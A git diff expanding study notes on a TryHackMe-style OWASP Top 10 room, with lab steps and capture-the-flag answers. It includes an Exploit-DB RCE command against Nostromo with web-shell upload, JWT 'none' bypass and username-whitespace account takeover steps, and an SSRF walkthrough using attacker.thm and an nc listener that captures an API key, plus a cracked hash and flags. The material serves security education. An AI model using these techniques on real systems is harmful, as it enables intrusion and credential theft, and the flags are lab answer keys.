@@ -1,8 +1,19 @@
 ## OWASP Top 10
 
 * OWASP: nonprofit for web-app security resources.
-* Top 10 list (summary): Broken Access Control; Cryptographic Failures; Injection; Insecure Design; Security Misconfiguration; Vulnerable & Outdated Components; Identification & Authentication Failures; Software & Data Integrity Failures; Security Logging & Monitoring Failures; SSRF.
-
+* Top 10 list (summary):
+``` 
+Broken Access Control
+Cryptographic Failures
+Injection
+Insecure Design
+Security Misconfiguration
+Vulnerable & Outdated Components
+Identification & Authentication Failures
+Software & Data Integrity Failures
+Security Logging & Monitoring Failures
+SSRF
+```
 ---
 
 ### 🔹 1. Broken Access Control
@@ -46,6 +57,8 @@ sqlite> SELECT * FROM customers;
 * Admin password hash: `6eea9b7ef19179a06954edd0f6c05ceb`
 * Cracked admin password: `qwertyuiop`
 * Flag: `THM{Yzc2YjdkMjE5N2VjMzNhOTE3NjdiMjdl}`
+
+---
 
 ### 🔹 3. Injection
 
@@ -91,6 +104,8 @@ if (isset($_GET['mooing'])) {
 * Flawed reset logic allowed attack to get into `joseph`’s account.
 * Flag found in joseph’s account: `THM{Not_3ven_c4tz_c0uld_sav3_U!}`
 
+---
+
 ### 🔹 5. Security Misconfiguration
 
 * What it is: insecure default configs, exposed debug interfaces, unnecessary features, overly permissive CORS, verbose error messages, default creds.
@@ -110,3 +125,154 @@ if (isset($_GET['mooing'])) {
   * DB file: `todo.db`
   * Flag: `THM{Just_a_tiny_misconfiguration}`
 
+---
+
+### 🔹 6. Vulnerable and Outdated Components
+
+Organizations often use outdated software with known vulnerabilities — e.g., WordPress 4.6 vulnerable to unauthenticated RCE. Attackers can easily exploit such flaws using public exploits from sources like **Exploit-DB**.
+
+#### Example: Nostromo 1.9.6
+
+* Tool: Exploit-DB
+* CVE: CVE-2019-16278
+* After fixing the exploit script and executing it:
+
+  ```bash
+  python2 47837.py 127.0.0.1 80 id
+  ```
+
+  **Result:** Remote Code Execution (RCE) as `_nostromo`.
+
+#### Lab
+
+* Target: `http://10.201.111.4:84`
+* Steps: Find exploit → run → upload web shell → execute commands
+
+  ```bash
+  cat /opt/flag.txt
+  ```
+* **Flag:** `THM{But_1ts_n0t_my_f4ult!}`
+
+---
+
+### 🔹 7. Identification and Authentication Failures
+
+Authentication controls verify user identity; weak implementations can expose accounts.
+
+**Common Flaws:**
+
+* Weak password policies
+* Brute-force vulnerability
+* Predictable or insecure session cookies
+
+**Mitigations:**
+
+* Enforce strong password policies
+* Implement lockout after failed attempts
+* Use Multi-Factor Authentication (MFA)
+
+#### Practical: Registration Logic Flaw
+
+* Vulnerability: Re-registration of existing users with whitespace variations.
+* Target: `http://10.201.40.243:8088`
+
+| Target User | Trick Used  | Flag                               |
+| ----------- | ----------- | ---------------------------------- |
+| `darren`    | `" darren"` | `fe86079416a21a3c99937fea8874b667` |
+| `arthur`    | `" arthur"` | `d9ac0f7db4fda460ac3edeb75d75e16e` |
+
+---
+
+### 🔹 8. Software and Data Integrity Failures
+
+**Integrity** ensures data hasn’t been tampered with. Hashes (MD5, SHA1, SHA256) verify this — e.g., checking software downloads with published checksums.
+
+#### Data Integrity Failures Example
+
+Applications trusting user-modifiable data (like cookies) can be exploited if integrity checks are missing.
+
+**Fix:** Use **JSON Web Tokens (JWTs)** with proper signature validation.
+
+#### JWT None Algorithm Exploit
+
+Some libraries allowed signature bypass via:
+
+1. Changing header `alg` to `none`
+2. Removing signature
+
+**Lab:**
+
+* Target: `http://10.201.40.243:8089/`
+* Login as `guest` → capture JWT (`jwt-session`) → modify payload to `admin` → re-encode.
+* **Flag:** `THM{Dont_take_cookies_from_strangers}`
+
+---
+
+### 🔹 9. Security Logging and Monitoring Failures
+
+Proper logging enables detection and investigation of security incidents.
+Missing or weak logging increases risks of **undetected attacks** and **regulatory non-compliance**.
+
+**Key Logging Data:**
+
+* HTTP status codes
+* Timestamps
+* Usernames
+* Endpoints
+* IP addresses
+
+**Monitoring Goals:**
+Detect suspicious patterns — e.g., brute force attempts, anomalous IPs, automated requests, or known payloads.
+
+#### Lab:
+
+* Analyze logs
+* **Attacker IP:** `49.99.13.16`
+* **Attack Type:** `Brute Force`
+
+---
+
+### 🔹 10. Server-Side Request Forgery (SSRF)
+
+Occurs when an application fetches remote resources based on **user-controlled input**, allowing attackers to make the server issue arbitrary requests.
+
+#### Example Scenario
+
+Vulnerable endpoint:
+
+```
+https://www.mysite.com/sms?server=attacker.thm&msg=ABC
+```
+
+This forces the server to request:
+
+```
+https://attacker.thm/api/send?msg=ABC
+```
+
+#### Possible Impacts
+
+* Internal network enumeration
+* Access to restricted services
+* Remote Code Execution (RCE)
+
+#### Lab:
+
+* Target: `http://MACHINE_IP:8087/`
+* **Admin Area Access:**
+
+  * Allowed host → `localhost`
+  * Default server param → `secure-file-storage.com`
+  * Redirect request to AttackBox and intercept API key
+```
+AttackBox
+user@attackbox$ nc -lvp 80
+Listening on 0.0.0.0 80
+Connection received on 10.10.1.236 43830
+GET /:8087/public-docs/123.pdf HTTP/1.1
+Host: 10.10.10.11
+User-Agent: PycURL/7.45.1 libcurl/7.83.1 OpenSSL/1.1.1q zlib/1.2.12 brotli/1.0.9 nghttp2/1.47.0
+Accept: */*
+X-API-KEY: THM{Hello_Im_just_an_API_key}
+```
+* **Flag:** `THM{Hello_Im_just_an_API_key}`
